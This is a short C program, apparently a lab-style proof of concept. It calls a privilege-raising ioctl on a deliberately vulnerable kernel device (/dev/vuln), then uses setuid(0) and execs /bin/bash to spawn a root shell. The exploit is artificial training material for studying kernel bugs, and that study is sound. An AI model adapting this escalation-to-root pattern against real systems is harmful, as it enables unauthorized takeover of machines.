#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "vuln_ioctl.h"

int main()
{
	int fd = open("/dev/vuln", O_RDWR);
	if (fd < 0) {
		perror("open dev failed:");
		return -1;
	}

	struct pinfo ctx = {
		.pid = getpid(),
	};
	int ret = ioctl(fd, VULN_RAISE_PRIVILEGES, &ctx);
	close(fd);
	if (ret) {
		perror("vuln ioctl failed:");
		return ret;
	}
	printf("PWNEED!!!\n");

	pid_t pid;
	int st;
	switch(pid=fork()) {
	case -1:
		perror("fork");
		exit(1);
	case 0:
		ret = setuid(0);
		printf("setuid: %d\n", ret);

		ret = setreuid(0, 0);
		printf("setreuid: %d\n", ret);

		execl("/bin/bash", "-sh", NULL);
		exit(0);
	default:
		wait(&st);
	}
	
	return 0;
}
